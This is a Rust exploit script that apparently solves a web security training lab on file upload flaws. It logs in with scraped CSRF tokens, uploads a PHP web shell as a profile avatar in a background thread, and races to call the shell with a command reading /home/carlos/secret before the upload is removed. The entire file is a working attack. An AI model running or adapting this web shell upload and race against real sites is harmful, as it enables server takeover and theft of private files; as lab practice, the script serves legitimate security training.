use file_upload_vulnerabilities::{
    HTTP_CLIENT as client, LOGIN_CSRF_TOKEN_SELECTOR, MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR,
    PASSWORD, USERNAME, WEBSHELL, generate_clap_parser, get_csrf_token, get_flag,
};
use reqwest::blocking::{
    Response,
    multipart::{Form, Part},
};
use std::sync::Mutex;
use std::thread;
use std::time::{Duration, Instant};

fn main() {
    let start_time: Instant = Instant::now();

    let args = generate_clap_parser();
    let lab_url = args.lab_url.as_str().trim_end_matches("/");
    let lab_url_mutex = Mutex::new(lab_url.to_string());

    // Making a GET request to the given url
    let response: Response = client
        .get(format!("{}/login", lab_url))
        .send()
        .expect("[-] Failed to make the GET request");

    // Extracting the body from the response
    let body: String = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token for the /login page
    let login_page_csrf_token: String = get_csrf_token(&body, &LOGIN_CSRF_TOKEN_SELECTOR);
    println!("[+] Login CSRF Token: {}", login_page_csrf_token);

    // Generating the login form data
    let data = [
        ("username", USERNAME),
        ("password", PASSWORD),
        ("csrf", &login_page_csrf_token),
    ];

    // Logging in as the given user. This request responds with the /my-account?id=wiener page
    let response: Response = client
        .post(format!("{}/login", lab_url))
        .form(&data)
        .send()
        .expect("[-] Failed to login as the given user");

    // Extracting the body from the response
    let body: String = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token from the /my-account?id=wiener page for the uploading avatar
    let my_avatar_upload_csrf_token: String =
        get_csrf_token(&body, &MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR);
    println!(
        "[+] My Avatar Upload CSRF Token: {}",
        &my_avatar_upload_csrf_token
    );

    // Generating the web shell payload to upload
    let payload: Part = Part::bytes(WEBSHELL.as_bytes())
        .file_name("web-shell.php")
        .mime_str("application/x-php")
        .expect("[-] Failed to generate payload");

    // Generating avatar upload multipart form data
    let form: Form = Form::new()
        .text("user", USERNAME)
        .text("csrf", my_avatar_upload_csrf_token)
        .part("avatar", payload);

    // NOTE: Uploading the payload in a separate thread
    thread::spawn(move || {
        client
            .post(format!(
                "{}/my-account/avatar",
                lab_url_mutex.lock().unwrap()
            ))
            .multipart(form)
            .send()
            .expect("[-] Failed to upload the payload");
    });

    let mut is_flag_found: bool = false;

    // NOTE: Fetching the flag simultaneously from the main thread
    for _ in 0..20 {
        if is_flag_found {
            break;
        }

        let response: Response = client
            .get(format!(
                "{}/files/avatars/web-shell.php?command=cat /home/carlos/secret",
                lab_url
            ))
            .send()
            .expect("[-] Failed to get secret");

        if response.status() == 200 {
            is_flag_found = true;
            get_flag(response.text().expect("[-] Failed to read secret"));
        }
    }

    let total_time: Duration = Instant::elapsed(&start_time);
    println!("[+] Total time taken: {}", total_time.as_secs_f64());
}
